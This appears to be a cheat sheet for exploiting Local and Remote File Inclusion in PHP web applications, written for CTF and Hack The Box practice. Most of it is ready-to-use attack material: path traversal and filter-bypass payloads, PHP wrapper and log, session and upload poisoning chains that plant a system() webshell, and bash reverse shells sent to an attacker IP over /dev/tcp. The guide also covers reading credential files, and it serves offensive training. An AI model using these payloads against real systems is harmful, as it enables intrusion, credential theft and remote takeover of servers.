> **Local File Inclusion (LFI)** and **Remote File Inclusion (RFI)** are web application vulnerabilities that allow an attacker to include files from the server's filesystem (LFI) or from remote URLs (RFI) by manipulating user-supplied input. They are among the most common vulnerability classes in CTFs and HTB boxes — LFI often escalates to full RCE via log poisoning, PHP wrappers, or session file inclusion. This guide covers exploitation from quick wins to advanced RCE chains.

---

## Quickstart — The Universal Tests

```bash
# The 5 things that tell you LFI is present:
../../../../etc/passwd           # classic path traversal
php://filter/convert.base64-encode/resource=index.php    # wrapper test
php://input                       # RCE via POST body (needs allow_url_include)
data://text/plain,<?php phpinfo();?>    # inline data wrapper
http://attacker.com/shell.php     # RFI (needs allow_url_include)
```

### Manual LFI testing checklist (in order of speed)

```bash
# 1. Basic traversal
http://target.htb/page.php?file=../../../../etc/passwd
http://target.htb/page.php?file=....//....//....//....//etc/passwd

# 2. Null byte (PHP < 5.3.4 only — rare on modern boxes)
http://target.htb/page.php?file=../../../../etc/passwd%00

# 3. PHP wrapper — read source code
http://target.htb/page.php?file=php://filter/convert.base64-encode/resource=index.php

# 4. PHP wrapper — RCE (if allow_url_include=On)
curl -X POST http://target.htb/page.php?file=php://input -d '<?php system($_GET["cmd"]); ?>'

# 5. Data wrapper — inline RCE
http://target.htb/page.php?file=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7Pz4=

# 6. RFI — include remote shell
http://target.htb/page.php?file=http://10.10.14.5/shell.php
```

> ⚠️ **PHP version matters:** Null byte truncation (`%00`) only works on PHP < 5.3.4. `allow_url_include` is Off by default since PHP 5.4. Most modern CTF boxes run PHP 7.x+, so wrappers like `php://filter` are your primary attack vector.

---

## LFI Traversal — The Basics

### Standard path traversal

```bash
# Linux
../../../../etc/passwd
/../../../etc/passwd
....//....//....//....//etc/passwd    # double traversal (bypasses some filters)

# Windows
..\..\..\..\windows\win.ini
..\..\..\..\windows\system32\drivers\etc\hosts
```

### Absolute vs relative paths

```bash
# Relative (most common in CTFs)
http://target.htb/page.php?file=../../../../etc/passwd

# Absolute
http://target.htb/page.php?file=/etc/passwd

# Drive letter (Windows)
http://target.htb/page.php?file=C:\inetpub\wwwroot\web.config
http://target.htb/page.php?file=C:/Windows/win.ini
```

### Path traversal depth cheat sheet

| Location | Linux Path | Windows Path |
| :------- | :--------- | :----------- |
| Web root | `/var/www/html/` | `C:\inetpub\wwwroot\` |
| Config | `/var/www/html/config.php` | `C:\inetpub\wwwroot\web.config` |
| Passwords | `/etc/passwd` | `C:\Windows\System32\drivers\etc\hosts` |
| Apache logs | `/var/log/apache2/access.log` | `C:\Apache24\logs\access.log` |
| Nginx logs | `/var/log/nginx/access.log` | — |
| Auth logs | `/var/log/auth.log` | — |
| SSH config | `/etc/ssh/sshd_config` | — |
| Cron | `/etc/crontab` | `C:\Windows\System32\Tasks\` |
| MySQL config | `/etc/mysql/my.cnf` | `C:\ProgramData\MySQL\my.ini` |
| Env vars | `/proc/self/environ` | — |
| Current dir | `/proc/self/cwd/` | — |
| PHP sessions | `/var/lib/php/sessions/sess_<ID>` | `C:\Windows\Temp\sess_<ID>` |

---

## PHP Wrappers — Your Primary Attack Vector

PHP wrappers are stream protocols that allow reading and sometimes writing data. They're the most powerful LFI technique because they work even when the app appends `.php` to your input.

### `php://filter` — Read source code as base64

```bash
# Read index.php source code
http://target.htb/page.php?file=php://filter/convert.base64-encode/resource=index.php

# Read config.php
http://target.htb/page.php?file=php://filter/convert.base64-encode/resource=config.php

# Read any file — server returns base64, decode locally
echo "PD9waHAg..." | base64 -d

# Chain with directory traversal
http://target.htb/page.php?file=php://filter/convert.base64-encode/resource=../../../../etc/passwd
```

> 💡 **Why this works:** `php://filter` converts the file contents to base64 *before* the `include()` processes it. Since base64 is plain text, PHP won't try to execute it as code. You get the raw source safely.

### `php://input` — RCE via POST body

```bash
# Step 1: Confirm allow_url_include is On
curl -X POST http://target.htb/page.php?file=php://input -d '<?php phpinfo(); ?>'

# Step 2: Execute system commands
curl -X POST http://target.htb/page.php?file=php://input -d '<?php system($_GET["cmd"]); ?>'

# Step 3: Get a reverse shell
curl -X POST "http://target.htb/page.php?file=php://input&cmd=bash -c 'bash -i >& /dev/tcp/10.10.14.5/4444 0>&1'"
```

> ⚠️ Requires `allow_url_include=On` in `php.ini` (Off by default). If it doesn't work, try `php://filter` to read source code instead.

### `data://` — Inline data wrapper

```bash
# Plain text
http://target.htb/page.php?file=data://text/plain,hello

# PHP code (needs allow_url_include + short_open_tag or full tag)
http://target.htb/page.php?file=data://text/plain,<?php system('id'); ?>

# Base64-encoded payload
http://target.htb/page.php?file=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7Pz4=

# With curl
curl "http://target.htb/page.php?file=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7Pz4="
```

### `phar://` — Deserialization via archives

```bash
# 1. Create a PHP file with a serialized payload
cat > shell.php << 'EOF'
<?php system($_GET["cmd"]); ?>
EOF

# 2. Create a phar archive (requires phar.readonly=Off in php.ini)
php -d phar.readonly=0 -r '
$phar = new Phar("shell.phar");
$phar->startBuffering();
$phar->addFile("shell.php");
$phar->setStub("<?php __HALT_COMPILER(); ?>");
$phar->stopBuffering();
'

# 3. Rename to allowed extension and upload
mv shell.phar shell.jpg

# 4. Include via phar wrapper
http://target.htb/page.php?file=phar:///var/www/uploads/shell.jpg/shell.php
```

### `zip://` — Include files inside ZIP archives

```bash
# 1. Create a zip containing a PHP shell
echo '<?php system($_GET["cmd"]); ?>' > shell.php
zip shell.zip shell.php

# 2. Rename to allowed extension and upload
mv shell.zip shell.jpg

# 3. Include (use %23 for # in URL)
http://target.htb/page.php?file=zip:///var/www/uploads/shell.jpg%23shell.php

# Alternative with compress.zlib://
http://target.htb/page.php?file=compress.zlib:///var/www/uploads/shell.jpg%23shell.php
```

### `expect://` — Direct command execution

```bash
# Rarely enabled, but devastating when it works
http://target.htb/page.php?file=expect://id
http://target.htb/page.php?file=expect://ls%20-la
http://target.htb/page.php?file=expect://whoami
```

### PHP Wrapper Cheat Sheet

| Wrapper | Purpose | Requires | CTF Use Case |
| :------ | :------ | :------- | :----------- |
| `php://filter` | Read file contents safely | None | Read PHP source code, config files |
| `php://input` | Execute POST body as PHP | `allow_url_include=On` | Direct RCE |
| `data://` | Inline data as PHP | `allow_url_include=On` | Direct RCE |
| `phar://` | Access files in phar archives | `phar.readonly=Off` (upload) | Deserialization, file inclusion |
| `zip://` | Access files in ZIP archives | Upload capability | File inclusion from uploaded ZIP |
| `compress.zlib://` | Zlib-compressed data | Zlib extension | Alternative to zip:// |
| `compress.bzip2://` | Bzip2-compressed data | Bzip2 extension | Alternative to zip:// |
| `expect://` | Execute system commands | `expect` extension | Direct RCE (rare) |
| `glob://` | Filename pattern matching | None | Enumerate files |
| `convert.base64-encode` | Encode to base64 | None | Read binary/source files |

---

## LFI to RCE — The Escalation Chain

When you can only read files (no wrappers for RCE), you need to poison a file the server will execute. These are the proven chains.

### 1. Log Poisoning — The Most Common Technique

Inject PHP code into a log file, then include it via LFI.

#### Apache/Nginx Access Log Poisoning

```bash
# Step 1: Inject PHP payload into the access log via User-Agent
curl -A '<?php system($_GET["cmd"]); ?>' http://target.htb/

# Step 2: Include the log file via LFI
http://target.htb/page.php?file=../../../../var/log/apache2/access.log&cmd=id
http://target.htb/page.php?file=../../../../var/log/nginx/access.log&cmd=id

# Step 3: Get a reverse shell
curl "http://target.htb/page.php?file=../../../../var/log/apache2/access.log&cmd=bash+-c+'bash+-i+>%26+/dev/tcp/10.10.14.5/4444+0>%261'"
```

> 💡 **Why User-Agent works:** Apache logs the User-Agent header in the access log. If you inject PHP code there, and the log file is readable + writable by the web server, the LFI will execute it.

#### Nginx Error Log Poisoning

```bash
# Inject payload via a malformed request to trigger an error log entry
curl "http://target.htb/<?php system(\$_GET['cmd']); ?>"

# Include the error log
http://target.htb/page.php?file=../../../../var/log/nginx/error.log&cmd=id
```

#### Syslog Poisoning (Debian/Ubuntu)

```bash
# Step 1: Check if syslog is accessible
$ curl "http://target.htb/page.php?file=../../../../var/log/syslog"

# Step 2: Inject payload via SSH (auth.log)
$ ssh '<?php system($_GET["cmd"]); ?>'@target.htb

# Step 3: Include auth.log
$ curl "http://target.htb/page.php?file=../../../../var/log/auth.log&cmd=id"

# Alternative: inject via logger command
$ logger '<?php system($_GET["cmd"]); ?>'
$ curl "http://target.htb/page.php?file=../../../../var/log/syslog&cmd=id"
```

### 2. `/proc/self/environ` Poisoning

If the web process's environment file is readable, inject a payload via the User-Agent header.

```bash
# Step 1: Confirm environ is readable
http://target.htb/page.php?file=/proc/self/environ

# Step 2: Inject payload via User-Agent
curl -A '<?php system($_GET["cmd"]); ?>' http://target.htb/

# Step 3: Include environ
http://target.htb/page.php?file=/proc/self/environ&cmd=id
```

> ⚠️ This only works if the web server runs as the process owner and `/proc/self/environ` is readable (rare on modern systems).

### 3. PHP Session File Inclusion

If you can control a session variable and know where sessions are stored, inject PHP code into the session file and include it.

```bash
# Step 1: Find session storage path
http://target.htb/page.php?file=php://filter/convert.base64-encode/resource=../../../../etc/php/7.4/fphp.ini

# Common session paths:
# /var/lib/php/sessions/sess_<PHPSESSID>
# /tmp/sess_<PHPSESSID>
# /var/lib/php5/sess_<PHPSESSID>
# C:\Windows\Temp\sess_<PHPSESSID>

# Step 2: Inject payload into session (if app uses sessions)
curl -c 'PHPSESSID=attacker_controlled' 'http://target.htb/login.php?language=<?php system($_GET["cmd"]); ?>'

# Step 3: Include session file
http://target.htb/page.php?file=/var/lib/php/sessions/sess_attacker_controlled&cmd=id
```

### 4. SSH Log Injection

```bash
# Step 1: Inject payload via SSH attempt (uses auth.log)
ssh '<?php system($_GET["cmd"]); ?>'@target.htb

# Step 2: Include auth.log
http://target.htb/page.php?file=../../../../var/log/auth.log&cmd=id
```

### 5. Mail Log Poisoning

```bash
# Step 1: Send an email with PHP payload in the body
sendmail hacker@target.htb <<< '<?php system($_GET["cmd"]); ?>'

# Step 2: Include mail log
http://target.htb/page.php?file=../../../../var/log/mail.log&cmd=id
```

### 6. File Upload + LFI Combo

Upload a file with PHP code disguised as an image, then include it via LFI.

```bash
# Step 1: Create a malicious image file
echo 'GIF89a<?php system($_GET["cmd"]); ?>' > shell.gif

# Step 2: Upload the file (e.g., via avatar upload form)
curl -F "file=@shell.gif" http://target.htb/upload.php

# Step 3: Include the uploaded file
http://target.htb/page.php?file=/var/www/uploads/shell.gif&cmd=id
```

### 7. PHP Filter Chains — Advanced RCE

When you can only use `php://filter` with limited chaining:

```bash
# Chain multiple filters to craft a working payload
http://target.htb/page.php?file=php://filter/convert.base64-decode/resource=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjJ10pOz8+

# Use convert.iconv to convert encoding (alternative chain)
http://target.htb/page.php?file=php://filter/convert.iconv.UTF-8.UTF-16BE|convert.quoted-printable-encode|convert.iconv.UTF-16BE.UTF-8|convert.base64-decode/resource=config.php
```

### LFI to RCE — Decision Tree

```
Can you use php://input or data:// wrapper?
├── YES → Direct RCE via POST body or inline data
└── NO
    ├── Can you read files with php://filter?
    │   ├── YES → Read config.php for DB creds, or look for file upload
    │   │   └── Can you upload files?
    │   │       ├── YES → Upload PHP shell as image → include it
    │   │       └── NO → Try log poisoning
    │   └── NO → Try basic traversal / null byte
    ├── Can you write to a log file?
    │   ├── YES → Log poisoning (access.log, auth.log, syslog)
    │   └── NO
    │       ├── Can you inject into /proc/self/environ?
    │       │   ├── YES → Environ poisoning
    │       │   └── NO → Session file inclusion (if sessions exist)
    │       └── Can you inject into SSH/mail logs?
    │           ├── YES → SSH auth.log / mail.log poisoning
    │           └── NO → Try expect:// wrapper or upload ZIP
    └── Can you upload a ZIP/phar?
        ├── YES → zip:// or phar:// inclusion
        └── NO → Stuck — enumerate more, check for other vulns
```

---

## RFI — Remote File Inclusion

RFI allows including files from external URLs. Requires `allow_url_include=On` and often `allow_url_fopen=On` in `php.ini`.

### Direct RFI

```bash
# Basic RFI — include a remote PHP shell
http://target.htb/page.php?file=http://10.10.14.5/shell.php

# With curl on attacker machine (serve the shell)
python3 -m http.server 80
# shell.php on attacker:
# <?php system($_GET['cmd']); ?>

# Include and execute
http://target.htb/page.php?file=http://10.10.14.5/shell.php&cmd=id
```

### SMB RFI (Windows)

```bash
# If HTTP is blocked but SMB works (Windows shares)
http://target.htb/page.php?file=\\10.10.14.5\share\shell.php

# Or with UNC path
http://target.htb/page.php?file=\\10.10.14.5\share\shell.php

# Start SMB server on attacker (impacket)
impacket-smbserver share . -smb2support
```

### FTP RFI

```bash
# Include via FTP
http://target.htb/page.php?file=ftp://10.10.14.5/shell.php

# Start FTP server on attacker
python3 -m pyftpdlib -p 21 -w
```

### RFI with PHP Wrapper Chaining

```bash
# Use php://input via RFI (double wrapper)
http://target.htb/page.php?file=php://input
# POST: <?php system($_GET['cmd']); ?>

# Use data:// via RFI
http://target.htb/page.php?file=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7Pz4=
```

### RFI Filter Bypass

```bash
# Double URL encoding (bypasses single-decode filters)
http://target.htb/page.php?file=http://10.10.14.5/shell.php
http://target.htb/page.php?file=h%74%74%70://10.10.14.5/shell.php
http://target.htb/page.php?file=hTTp://10.10.14.5/shell.php

# Null byte (old PHP)
http://target.htb/page.php?file=http://10.10.14.5/shell.txt%00

# Question mark truncation
http://target.htb/page.php?file=http://10.10.14.5/shell.txt?

# Slash backslash confusion
http://target.htb/page.php?file=http://10.10.14.5/\shell.php
http://target.htb/page.php?file=http:/\10.10.14.5/shell.php
```

---

## WAF / Filter Bypass Techniques

### Traversal filter bypass

```bash
# Double encoding (bypasses single-decode)
%252e%252e%252fetc%252fpasswd         # %25 = '%', so %252e → %2e → '.'

# Double traversal
....//....//....//....//etc/passwd     # each ..// collapses to ../

# Mixed separators
..%2f..%2f..%2f..%2fetc/passwd
..%252f..%252f..%252fetc/passwd

# URL encoding
%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd

# UTF-8 / Overlong encoding
%c0%ae%c0%ae/%c0%ae%c0%ae/etc/passwd
%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%afetc%c0%afpasswd

# Backslash (Windows)
..\\..\\..\\..\\windows\\win.ini

# Non-recursive stripping (remove ../ once, result still has ../)
....../         # strips inner ../ → ../
..././          # strips inner /./ → ../
..;/            # semicolon trick (Tomcat)
```

### Extension append bypass

```bash
# When app appends .php to your input:
# include($_GET['file'] . ".php");

# Null byte (PHP < 5.3.4)
../../../../etc/passwd%00

# php://filter (ignores extension)
php://filter/convert.base64-encode/resource=../../../../etc/passwd

# Path truncation (PHP < 7.0)
../../../../etc/passwd/././././././././././././././././././././././././
../../../../etc/passwd..............................................................................

# Short tag (if short_open_tag=On)
http://target.htb/page.php?file=data://text/plain,<?=system('id')?>
```

### Keyword filter bypass

```bash
# If "php://" is blocked:
phP://filter     # case variation
php:// /filter    # space/whitespace injection
pHp://filter      # mixed case

# If "://" is blocked:
php:/ filter      # some parsers ignore spaces
php:////filter    # extra slashes

# If "system" is blocked:
passthru('id')
exec('id')
shell_exec('id')
popen('id', 'r')
proc_open('id', ...)

# If "base64" is blocked:
convert.iconv.UTF-8.CSISO2022JP|convert.base64-decode

# Null byte in filename (if %00 is filtered)
%0a, %0d, %00 (different encodings)
```

### Common LFI parameter names to fuzz

```bash
# These parameters often accept file paths:
file, page, include, inc, dir, path, folder, root, doc
lang, cmd, pg, style, pdf, template, php_path, doc_path
module, mod, content, site, load, show, read, view
```

---

## Windows-Specific LFI

### Windows path tricks

```bash
# Drive letters
http://target.htb/page.php?file=C:\inetpub\wwwroot\web.config
http://target.htb/page.php?file=C:/inetpub/wwwroot/web.config

# UNC paths (can trigger SMB)
http://target.htb/page.php?file=\\10.10.14.5\share\file.txt

# Forward slash (works on Windows)
http://target.htb/page.php?file=C:/Windows/win.ini

# 8.3 short names
http://target.htb/page.php?file=C:/Progra~1/Apache~1/Apache24/conf/httpd.conf
```

### Windows sensitive files

| File | Path |
| :--- | :--- |
| Hosts file | `C:\Windows\System32\drivers\etc\hosts` |
| IIS config | `C:\inetpub\wwwroot\web.config` |
| Apache config | `C:\Apache24\conf\httpd.conf` |
| XAMPP config | `C:\xampp\apache\conf\httpd.conf` |
| Windows INI | `C:\Windows\win.ini` |
| SAM backup | `C:\Windows\Repair\SAM` |
| System backup | `C:\Windows\Repair\SYSTEM` |
| User profiles | `C:\Users\<user>\` |
| PHP sessions | `C:\Windows\Temp\sess_<ID>` |

---

## LFI Scanning Tools

### LFImap — Automated LFI scanner and exploiter

```bash
# Install
git clone https://github.com/hansmach1ne/LFImap
cd LFImap
chmod +x lfimap.py

# Basic scan
python3 lfimap.py -u "http://target.htb/page.php?file=test"

# Scan with GET parameter
python3 lfimap.py -u "http://target.htb/page.php" -p "file"

# Scan with POST parameter
python3 lfimap.py -u "http://target.htb/page.php" -p "file" --postdata "file=test"

# Scan with cookies (authenticated)
python3 lfimap.py -u "http://target.htb/admin.php" -p "page" -c "PHPSESSID=abc123"
```

### Kadimus — LFI scanner and exploit tool

```bash
# Install
git clone https://github.com/P0cL4bs/kadimus
cd kadimus && make

# Basic scan
./kadimus -u "http://target.htb/page.php?file=test"

# Scan with specific parameter
./kadimus -u "http://target.htb/page.php" --param "file"
```

### LFISuite — LFI automatic exploiter

```bash
# Install
git clone https://github.com/D35m0nd142/LFISuite
cd LFISuite

# Run
python3 lfisuite.py
```

### Manual scanning with curl/ffuf

```bash
# Fuzz LFI parameters
ffuf -u "http://target.htb/page.php?file=FUZZ" -w /usr/share/seclists/Fuzzing/LFI/LFI-gracefulsecurity-linux.txt -fs 0

# Fuzz with traversal payloads
ffuf -u "http://target.htb/page.php?file=FUZZ" -w /usr/share/seclists/Fuzzing/LFI/LFI-gracefulsecurity-linux.txt -fs 0 -mc 200

# Quick test with curl
curl -s "http://target.htb/page.php?file=../../../../etc/passwd" | head -5

# Test PHP wrapper
curl -s "http://target.htb/page.php?file=php://filter/convert.base64-encode/resource=index.php" | base64 -d
```

---

## CTF / HTB LFI Workflow

### Step 1 — Identify the parameter

```bash
# Browse the app, find any parameter that references a file
# Common patterns:
#   ?page=home
#   ?file=about
#   ?include=header
#   ?doc=readme
#   ?template=welcome

# Fuzz common LFI parameter names
ffuf -u "http://target.htb/FUZZ=test" -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt -fs 0
```

### Step 2 — Test for LFI

```bash
# Basic tests (in order)
curl "http://target.htb/page.php?file=../../../../etc/passwd"
curl "http://target.htb/page.php?file=....//....//....//....//etc/passwd"
curl "http://target.htb/page.php?file=php://filter/convert.base64-encode/resource=index.php"
```

### Step 3 — Determine exploitation path

```bash
# If /etc/passwd is readable → check for users with shells
curl -s "http://target.htb/page.php?file=../../../../etc/passwd" | grep -v nologin | grep -v false

# If PHP source is readable → look for credentials, API keys, config
curl -s "http://target.htb/page.php?file=php://filter/convert.base64-encode/resource=config.php" | base64 -d

# Check PHP config for allow_url_include
curl -s "http://target.htb/page.php?file=php://filter/convert.base64-encode/resource=../../../../etc/php/7.4/fphp.ini" | base64 -d | grep allow_url_include
```

### Step 4 — Escalate to RCE

```bash
# If allow_url_include=On → php://input or data://
curl -X POST "http://target.htb/page.php?file=php://input" -d '<?php system($_GET["cmd"]); ?>'

# If file upload exists → upload PHP shell as image
echo 'GIF89a<?php system($_GET["cmd"]); ?>' > shell.gif
curl -F "file=@shell.gif" http://target.htb/upload.php
curl "http://target.htb/page.php?file=/var/www/uploads/shell.gif&cmd=id"

# If neither → log poisoning
curl -A '<?php system($_GET["cmd"]); ?>' http://target.htb/
curl "http://target.htb/page.php?file=../../../../var/log/apache2/access.log&cmd=id"
```

### Step 5 — Get a shell

```bash
# Reverse shell via LFI
curl "http://target.htb/page.php?file=../../../../var/log/apache2/access.log" \
  --data-urlencode "cmd=bash -c 'bash -i >& /dev/tcp/10.10.14.5/4444 0>&1'"

# Listener on attacker
nc -lvnp 4444
```

### LFI — Complete One-liner Pipeline

```bash
#!/bin/bash
TARGET="http://10.129.1.10"
PARAM="file"

echo "[*] Testing LFI on $TARGET?$PARAM"
echo "[+] /etc/passwd:"
curl -s "$TARGET?$PARAM=../../../../etc/passwd" | head -3

echo "[+] PHP source (index.php):"
curl -s "$TARGET?$PARAM=php://filter/convert.base64-encode/resource=index.php" | base64 -d 2>/dev/null | head -20

echo "[+] Checking allow_url_include:"
curl -s "$TARGET?$PARAM=php://filter/convert.base64-encode/resource=../../../../etc/php/7.4/fphp.ini" | base64 -d 2>/dev/null | grep allow_url_include

echo "[+] Testing RCE via php://input:"
curl -s -X POST "$TARGET?$PARAM=php://input" -d '<?php echo "RCE_OK"; ?>' | grep -q "RCE_OK" && echo "[✓] RCE WORKS" || echo "[-] RCE not possible"
```

---

## Troubleshooting — What You'll Actually See

| Error / Symptom | Likely Cause |
| :-------------- | :----------- |
| Empty page / 200 with no content | File doesn't exist or `include()` failed silently |
| `Failed to open stream` | Wrong path or file permissions |
| `include(): Failed opening` | Path traversal depth wrong or extension appended |
| `Warning: include(): open_basedir restriction` | PHP `open_basedir` limits file access |
| `allow_url_include` error | `allow_url_include=Off` — use `php://filter` instead |
| `php://input` returns empty | `allow_url_include=Off` — wrapper not available |
| `/proc/self/environ` returns 403/empty | File not readable by web server |
| Log file is empty or 0 bytes | Wrong log path or logs are in a different location |
| Session file not found | Sessions stored in `/tmp` or different path |
| Page always shows the same content | Your traversal depth is wrong — try more `../` |
| `%00` doesn't truncate the path | PHP ≥ 5.3.4 — null byte truncation disabled |
| `data://` wrapper doesn't work | `allow_url_include=Off` |

---

## Common LFI/RFI Mistakes in CTFs

| Mistake | Fix |
| :------ | :-- |
| Wrong traversal depth — `../etc/passwd` works but `../../etc/passwd` doesn't | Try more `../` — you may need to go deeper |
| `%00` doesn't truncate the path | PHP ≥ 5.3.4 disabled null byte truncation — use `php://filter` instead |
| `php://input` returns empty | `allow_url_include=Off` — use `php://filter` to read source, or try log poisoning |
| `zip://` URL shows the file contents as garbled text | You forgot to URL-encode `#` as `%23` — the `#` is interpreted as a URL fragment |
| `data://` wrapper doesn't work | `allow_url_include=Off` — this wrapper also requires it to be On |
| Log poisoning doesn't work — log file is empty | Check `/var/log/apache2/access.log`, `/var/log/nginx/access.log`, `/var/log/auth.log`, `/var/log/syslog` — wrong path is the #1 cause |
| Page always shows the same content | Your traversal depth is wrong — try more `../` or an absolute path |
| `Failed to open stream` error | Wrong path or file permissions — check if the web server user can read the file |
| `open_basedir restriction` error | PHP limits file access — try `php://filter` which sometimes bypasses open_basedir |
| Confusing `php://filter` with `php://input` | `filter` = read file contents (safe), `input` = execute POST body as PHP (RCE) |
| Forgetting URL encoding in the browser | Use `curl` or Burp Repeater — browsers mangle special characters |
| `/proc/self/environ` returns 403 | File not readable by web server — rare on modern systems, try log poisoning instead |

---

## Installing Tools

```bash
# LFImap — automated LFI scanner and exploiter
$ git clone https://github.com/hansmach1ne/LFImap
$ cd LFImap && chmod +x lfimap.py

# Kadimus — LFI scanner and exploit tool
$ git clone https://github.com/P0cL4bs/kadimus
$ cd kadimus && make

# LFISuite — LFI automatic exploiter
$ git clone https://github.com/D35m0nd142/LFISuite

# ffuf — for fuzzing LFI parameters (usually pre-installed)
$ sudo apt install ffuf                 # Debian/Kali
$ sudo pacman -S ffuf                   # Arch
```

---

## CTF / HTB LFI Workflow Checklist

1. **Map the app** — browse manually, find parameters that reference files (`?page=`, `?file=`, `?include=`, `?doc=`, `?template=`)
2. **Test for LFI** with `../../../../etc/passwd`, `php://filter/convert.base64-encode/resource=index.php`, and `%00` truncation
3. **Read PHP source** — use `php://filter` to get `config.php`, `db.php`, or any file with credentials
4. **Check PHP config** — read `php.ini` via `php://filter` to find `allow_url_include`, `open_basedir`, `session.auto_start`
5. **Escalate to RCE** — follow the decision tree: wrappers → file upload + LFI → log poisoning → session inclusion → zip/phar
6. **If stuck** — try different traversal depths, double encoding, alternative log paths, or session file inclusion
7. **Get a shell** — once you have RCE, send a reverse shell via the `cmd` parameter

---

## References

- [PayloadsAllTheThings — File Inclusion](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/File%20Inclusion)
- [HackTricks — File Inclusion / Path Traversal](https://book.hacktricks.xyz/pentesting-web/file-inclusion)
- [OWASP — File Inclusion](https://owasp.org/www-community/attacks/Includes)
- [PortSwigger — File Path Traversal](https://portswigger.net/web-security/file-path-traversal)
- [LFImap — LFI Scanner](https://github.com/hansmach1ne/LFImap)
- [Kadimus — LFI Exploitation](https://github.com/P0cL4bs/kadimus)
- [PHP Stream Wrappers Manual](https://www.php.net/manual/en/wrappers.php)
- [SecLists — Fuzzing LFI Wordlists](https://github.com/danielmiessler/SecLists/tree/master/Fuzzing/LFI)
